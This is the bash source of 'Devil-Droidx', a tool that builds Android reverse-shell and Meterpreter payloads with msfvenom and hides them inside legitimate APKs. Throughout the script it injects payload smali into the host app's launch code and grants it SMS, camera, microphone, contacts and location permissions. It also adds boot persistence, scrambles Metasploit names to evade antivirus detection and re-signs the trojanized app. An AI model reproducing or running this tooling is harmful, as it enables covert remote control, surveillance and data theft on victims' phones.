#!/usr/bin/env bash
#
# Devil-Droidx Framework.
# Devil-Droidx is a framework that create & generate & embed apk payload to penetrate android platform
# 
#                  Created By Prashant Joshi .
#                 IamPrashu-Labs

# Special thanks to : Neha Kandpal , Peater J , tejix .kil and Johan Jack
#
# this is an open source tool if you want to modify or add something . Please give me a copy.

# resize terminal window
resize -s 40 70 > /dev/null
#Colors
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
RedF="${Escape}[31m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Escape}[36m";
Reset="${Escape}[0m";
# Check root
[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
clear
# check internet 
function checkinternet() 
{
  ping -c 1 google.com > /dev/null 2>&1
  if [[ "$?" != 0 ]]
  then
    echo -e $yellow " Checking For Internet: ${RedF}FAILED"
    echo
    echo -e $red "This Script Needs An Active Internet Connection"
    echo
    echo -e $yellow " Devil-Droidx Exit"
    echo && sleep 2
    exit
  else
    echo -e $yellow " Checking For Internet: ${LighGreenF}CONNECTED"
  fi
}
checkinternet
sleep 2
#Define options
path=`pwd`
lanip=`hostname -I`
publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
ver="v0.3"
APKTOOL="$path/tools/apktool.jar"
VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
echo ""
sleep 1
# spinner for Metasploit Generator
spinlong ()
{
    bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
echo -e $red"[*] Stopping Services... "
apache_svc_stop
postgresql_stop
sleep 1
echo ""
echo -e $yellow"[*] Thanks For Using Devil-Droidx  :)"
exit
}
#detect system
echo -e $blue
sudo cat /etc/issue.net
#check dependencies existence
echo -e $blue "" 
echo "® Checking dependencies configuration ®" 
echo "                                       " 
# check if metasploit-framework is installed
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Metasploit-Framework..............${LighGreenF}[ found ]"
which msfconsole > /dev/null 2>&1
sleep 2
else
echo -e $red "[ X ] Metasploit-Framework  -> ${RedF}not found "
echo -e $yellow "[ ! ] Installing Metasploit-Framework "
sudo apt-get install metasploit-framework -y
echo -e $blue "[ ✔ ] Done installing ...."
which msfconsole > /dev/null 2>&1
sleep 2
fi
#check if xterm is installed
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Xterm.............................${LighGreenF}[ found ]"
which xterm > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] xterm -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Xterm "
sleep 2
echo -e $green ""
sudo apt-get install xterm -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which xterm > /dev/null 2>&1
fi
#check if zenity is installed
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zenity............................${LighGreenF}[ found ]"
which zenity > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zenity -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Zenity "
sleep 2
echo -e $green ""
sudo apt-get install zenity -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which zenity > /dev/null 2>&1
fi
#Check for Android Asset Packaging Tool
which aapt > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Aapt..............................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Aapt -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Aapt "
sleep 2
echo -e $green ""
sudo apt-get install aapt -y
sudo apt-get install android-framework-res -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which aapt > /dev/null 2>&1
fi
#Check for Apktool Reverse Engineering
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Apktool...........................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Apktool -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Apktool "
sleep 2
echo -e $green ""
sudo apt-get install apktool -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which apktool > /dev/null 2>&1
fi
#check for zipalign
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "[ ✔ ] Zipalign..........................${LighGreenF}[ found ]"
which aapt > /dev/null 2>&1
sleep 2
else
echo ""
echo -e $red "[ X ] Zipalign -> ${RedF}not found! "
sleep 2
echo -e $yellow "[ ! ] Installing Zipalign "
sleep 2
echo -e $green ""
sudo apt-get install zipalign -y
clear
echo -e $blue "[ ✔ ] Done installing .... "
which zipalign > /dev/null 2>&1
fi
directory="$path/devilapk"
if [ ! -d "$directory" ]; then
	echo "Creating the output directory..."
	mkdir $directory
        sleep 3
fi
echo -e $cyan "╔────────────────────────────────────────────────╗"
echo -e $cyan "|    Devil-Droidx Framework version 2.ps         |"
echo -e $cyan "|           - IamPrashu-labs.co                  |"
echo -e $cyan "|   Please do not upload APK to VirusTotal.com   |"
echo -e $cyan "┖────────────────────────────────────────────────┙"
#function ascii banner
function print_ascii_art {
echo -e $blue "██╗ █████╗ ███╗   ███╗██████╗ ██████╗  █████╗ ███████╗██╗  ██╗██╗   ██╗  ==  ██╗      █████╗ ██████╗ ███████╗"
echo -e $blue "██║██╔══██╗████╗ ████║██╔══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██║   ██║  ==  ██║     ██╔══██╗██╔══██╗██╔════╝"
echo -e $blue "██║███████║██╔████╔██║██████╔╝██████╔╝███████║███████╗███████║██║   ██║  ==  ██║     ███████║██████╔╝███████╗"
echo -e $blue "██║██╔══██║██║╚██╔╝██║██╔═══╝ ██╔══██╗██╔══██║╚════██║██╔══██║██║   ██║  ==  ██║     ██╔══██║██╔══██╗╚════██║"
echo -e $blue "██║██║  ██║██║ ╚═╝ ██║██║     ██║  ██║██║  ██║███████║██║  ██║╚██████╔╝  ==  ███████╗██║  ██║██████╔╝███████║"
echo -e $blue "╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ==  ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝"
                                                                                                           
echo -e $blue "            ██████╗ ██████╗  ██████╗ ██████╗ ██╗   ██╗ ██████╗████████╗                                 "   
echo -e $blue "            ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██║   ██║██╔════╝╚══██╔══╝                                 "
echo -e $blue "            ██████╔╝██████╔╝██║   ██║██║  ██║██║   ██║██║        ██║                                    "   
echo -e $blue "            ██╔═══╝ ██╔══██╗██║   ██║██║  ██║██║   ██║██║        ██║                                    "   
echo -e $blue "            ██║     ██║  ██║╚██████╔╝██████╔╝╚██████╔╝╚██████╗   ██║                                    "   
echo -e $blue "            ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝ ............. By - Prashant Joshi  "          
   
                                 
}
#function lhost
function get_lhost() 
{
  LHOST=$(zenity --title="☢ SET LHOST ☢" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
}
#function lport
function get_lport() 
{
  LPORT=$(zenity --title="☢ SET LPORT ☢" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
}
#function payload
function get_payload()
{
  PAYLOAD=$(zenity --list --title "☢ DEVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
}
function get_payload1()
{
  PAYLOAD=$(zenity --list --title "☢ DEVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
}
#function name
function payload_name()
{
 apk_name=$(zenity --title "☢ PAYLOAD NAME ☢" --text "example: devilapk" --entry --entry-text "devilapk" --width 300 2> /dev/null)
}
#function original apk
function orig_apk()
{
 orig=$(zenity --title "☢ ORIGINAL APK ☢" --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null) 
}
#function change icon
function change_icon()
{
 iconos=$(zenity --title "☢ CHOOSE ICON ☢" --filename=$path --file-selection --file-filter "*.png" --text "chose your own icon." 2> /dev/null) 
}
#function generate payload
function gen_payload()
{
 echo -e $yellow ""
 echo "[*] Generating apk payload"
 spinlong
 xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
function embed_payload()
{
 echo -e $yellow ""
 echo "[*] Embeding apk payload in orginal apk"
 spinlong
 xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
#function update apktool
function up_apktook()
{
 echo -e $yellow ""
 echo "[*] Removing 1.apk framework file..."
 spinlong
 apktool empty-framework-dir --force > /dev/null 2>&1
}
#function apktool
function apk_decomp()
{
 echo -e $yellow ""
 echo "[*] Decompiling Payload APK..."
 spinlong
 xterm -T "Decompiling Payload" -e java -jar $APKTOOL d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
 rm $apk_name.apk
}
function apk_comp()
{
 echo -e $yellow ""
 echo "[*] Rebuilding APK file..."
 spinlong
 xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/payload -o evil.apk > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
}
function apk_decomp1()
{
 echo -e $yellow ""
 echo "[*] Decompiling Original APK..."
 spinlong
 xterm -T "Decompiling Original" -e java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
}
function apk_comp1()
{
 echo -e $yellow ""
 echo "[*] Rebuilding Backdoored APK..."
 spinlong
 xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/original -o evil.apk > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
 rm -r original > /dev/null 2>&1
}
#function errors
function error()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 Failed to rebuild backdoored apk【X】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
function error0()
{
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "【X】 An Error Was Occured .Ty Again【X】"
   echo
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
}
#function apache2 service
function apache_svc_start()
{
 service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
function apache_svc_stop()
{
 service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
#function postgresql service
function postgresql_start()
{
 service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
function postgresql_stop()
{
 service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}
# function adding permission
function perms()
{
 echo -e $yellow ""
 echo "[*] Adding permission and Hook Smali"
 spinlong
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 android_nam=$tmp
}
# functions hook smali
function hook_smalies()
{
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    spinlong
    echo -e $red ""
    echo "[x] cant find : $android_activity.smali"
    echo "[*] try another ..."
    spinlong
    sleep 2
    echo
    echo "##################################################################"
    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    echo "In line:$hook_num"
    echo "##################################################################"
    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi 
 fi
}
#function flagged by av & updating smalies
function flagg()
{
 echo -e $yellow ""
 echo "[*] Scrubbing the payload contents to avoid AV signatures..."
 spinlong
 mv payload/smali/com/metasploit payload/smali/com/$VAR1
 mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
 mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sleep 2
 if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
    echo
    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
    apache_svc_stop
    postgresql_stop
    exit 1
 fi
 sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
 sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
 sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
 sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
 sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
 sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
 sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
}
function flagg_original()
{
 echo -e $yellow ""
 echo "[*] Scrubbing the payload contents to avoid AV signatures..."
 spinlong
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 mv payload/smali/com/metasploit/stage payload/smali/com/metasploit/$VAR1
 mv payload/smali/com/metasploit/$VAR1/MainBroadcastReceiver.smali payload/smali/com/metasploit/$VAR1/$VAR2.smali
 mv payload/smali/com/metasploit/$VAR1/MainService.smali payload/smali/com/metasploit/$VAR1/$VAR3.smali
 mv payload/smali/com/metasploit/$VAR1/Payload.smali payload/smali/com/metasploit/$VAR1/$VAR4.smali
 sleep 2
 if [ -f payload/smali/com/metasploit/$VAR1/PayloadTrustManager.smali ]; then
    echo
    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
    apache_svc_stop
    postgresql_stop
    exit 1
 fi
 echo -e $yellow ""
 echo "[*] Adding permission and Hook Smali"
 spinlong
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "s|Lcom/metasploit/stage|L$package_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
 sed -i "s|L$package_name/$VAR1/Payload|L$package_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
 sed -i "s|L$package_name/$VAR1/MainService|L$package_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
 sed -i "s|L$package_name/$VAR1/MainBroadcastReceiver|L$package_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$package_name > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name/$VAR1|L$app_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
  sed -i "s|L$app_name/$VAR1/$VAR4|L$app_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
  sed -i "s|L$app_name/$VAR1/$VAR3|L$app_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
  sed -i "s|L$app_name/$VAR1/$VAR2|L$app_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$app_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.$VAR1.$VAR3'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$package_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.$VAR1.$VAR3'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
 android_nam=$tmp
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
  if [ $android_name ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  echo
  echo "##################################################################"
  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  echo "In line:$hook_num"
  echo "##################################################################"
  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
  rc=$?
  if [ $rc != 0 ]; then
    spinlong
    echo -e $red ""
    echo "[x] cant find : $android_activity.smali"
    echo "[*] try another ..."
    spinlong
    sleep 2
    echo
    echo "##################################################################"
    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
    echo "In line:$hook_num"
    echo "##################################################################"
    starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
  fi
 fi
}
# function chage name and icon
function merge_name_ico()
{
 echo -e $yellow ""
 echo "[*] Changing name and icon payload..."
 spinlong
 label='    <application android:label="@string/app_name">'
 label1='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
 sed -i "s|$label|$label1|g" $path/payload/AndroidManifest.xml 2>&1
 sed -i "s|MainActivity|$apk_name|g" $path/payload/res/values/strings.xml 2>&1
 mkdir $path/payload/res/drawable
 cp $iconos $path/payload/res/drawable/main_icon.png
}
#function signing apk
function sign()
{
 echo -e $yellow ""
 echo "[*] Checking for ~/.android/debug.keystore for signing..."
 spinlong
 if [ ! -f ~/.android/debug.keystore ]; then
     echo -e $red ""
     echo " [ X ] Debug key not found. Generating one now..."
     spinlong
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e $lightgreen ""
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
 fi
 spinlong
 echo -e $yellow ""
 echo "[*] Attempting to sign the package with your android debug key"
 spinlong
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA evil.apk androiddebugkey > /dev/null 2>&1
 echo -e $yellow 
 echo "[*] Verifying signed artifacts..."
 spinlong
 jarsigner -verify -certs evil.apk > /dev/null 2>&1
 rc=$?
 if [ $rc != 0 ]; then
   echo -e $red ""
   echo "[!] Failed to verify signed artifacts"
   apache_svc_stop
   postgresql_stop
   exit $rc
 fi
 echo -e $yellow
